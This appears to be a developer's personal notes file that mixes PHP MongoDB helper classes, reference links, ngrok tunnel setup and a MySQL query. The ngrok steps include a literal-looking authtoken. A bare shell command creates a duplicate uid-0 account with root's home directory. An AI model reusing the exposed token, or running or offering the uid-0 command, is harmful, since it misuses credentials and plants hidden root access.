

// 打印内容
	public static function pre($data,$vardump=TRUE)
	{
		echo '<pre>';
		$vardump ? exit(var_dump($data)) : exit(print_r($data));
		echo '</pre>';
	}




class moc
	{
		private static $instance = null;
		private static $handle = null;

		private function __construct()
		{
			// 服务器配置文件
			$ini = parse_ini_file("/base/etc/servers.ini",TRUE)['MONGO'];
			$database = $ini['DATABASE'];

			//尝试连接MongoDB
			try
			{
				$mongo =  new MongoClient($ini['HOST'] . ':' . $ini['PORT']);
				$dbc = $mongo -> listDBs();
				// 确认是否存在指定的数据库，以免创建意外的数据库
				$databases = array_column($dbc['databases'],'name');
				if(in_array($database,$databases))
				{
					self::$handle = $mongo -> selectDB($database);

				// 如果不存在指定的数据库，提示错误，要求数据库管理员创建数据库
				}else{ exit(self::error('CONNECT ERROR: NO FOUND DINFINED DATABASE')); }

			}catch(Exception $e){ exit(self::error('CONNECT ERROR:CANNOT CONNECT TO THE DEFINED MONGO SERVER.')); }
		}

		//返回单一实例
		public static function MGO($collection) //单一实例
		{
			if(!(self::$instance instanceof self)){	self::$instance = new self;	}
			return self::$handle -> $collection;
		}

		//error提示
		private static function error($error)
		{
			return '<div style="width:80%;height:auto;border:2px solid red;text-align:center;margin:10% auto;">
				  <p style="vertical-align:middle;font-size:22px;color:red;margin-left:2%;font-weight:bold;">ERROR
				  </p><p>' . $error . '</p></div>';
		}
	}


	class mon
	{

		/*
		 * php MongoClient::find返回的是指针
		 * 这个函数把返回结果转换成数组
		 */
		public static function pretty($cursor)
		{
			$arr = [];
			foreach($cursor AS $doc){ $arr[] = $doc; }
			return $arr;
		}
	}








http://www.yiibai.com/nodejs/    nodejs中文网站

https://pecl.php.net/package/mongo/     php_mongo.dll下载地址

https://ngrok.com/download/    内网映射到外网

    1.Start by downloading ngrok.
    2.Install your authtoken    ./ngrok authtoken 2qv36WkU2nDQ363NtNh2k_4Coy1Q28YcZMJF6Aejw43
    3.Create your first secure tunnel ./ngrok http 80
    4.Open the web interface at http://localhost:4040 to inspect and replay requests


面向对象应该牢记：保持对象小型化，模块化，非耦合以及流线型 。

useradd -o -u 0 -g 0 -M -d /root -s /bin/bash vxzhan
select (@i:=@i+1) as i,post_time from tb_check_price,(select @i:=0) as tt  order by post_time desc; 

http://auto.sohu.com/20160607/n453446539.shtml  驾驶证到期还去车管所？你真是out了
